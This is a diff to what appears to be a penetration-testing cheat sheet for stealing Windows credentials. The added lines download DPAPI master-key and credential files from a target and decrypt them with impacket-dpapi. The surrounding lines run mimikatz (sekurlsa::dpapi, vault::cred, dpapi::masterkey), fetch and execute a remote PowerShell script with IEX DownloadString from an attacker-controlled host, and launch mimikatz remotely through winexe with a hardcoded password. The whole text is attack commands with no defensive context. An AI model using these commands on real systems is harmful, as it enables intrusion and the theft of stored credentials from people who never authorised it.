@@ -1563,7 +1563,12 @@ vault::cred /patch
 sekurlsa::dpapi
 
 +---------- DPAPI ----------+
+mkdir dpapi
 IEX (New-Object Net.WebClient).DownloadString('http://$MYIP/windows/dpapi.ps1')
+download ...\S-1-5...\7dc6a492-36e2-4c2d-be66-ba29d263dda2 dpapi/
+download ...\Credentials\936A68B5AC87C545C4A22D1AF264C8E9 dpapi/
+impacket-dpapi masterkey -file dpapi/7dc6a492-36e2-4c2d-be66-ba29d263dda2 -sid S-1-5... -password OF_DPAPI_USER | grep 'Decrypted key:'
+impacket-dpapi credential -file dpapi/936A68B5AC87C545C4A22D1AF264C8E9 -key 0xdcd70638e50e...
 rlwrap winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\mimikatz.exe'
 dpapi::masterkey /in:"...\<USER>\...\...\Microsoft\Protect\<USER_SID>\<CRED_FILE>" /sid:<USER_SID> /rpc
 dpapi::masterkey /in:"...\<USER>\...\...\Microsoft\Protect\<USER_SID>\<CRED_FILE>" /sid:<USER_SID> /password:$PASSWORD /protected
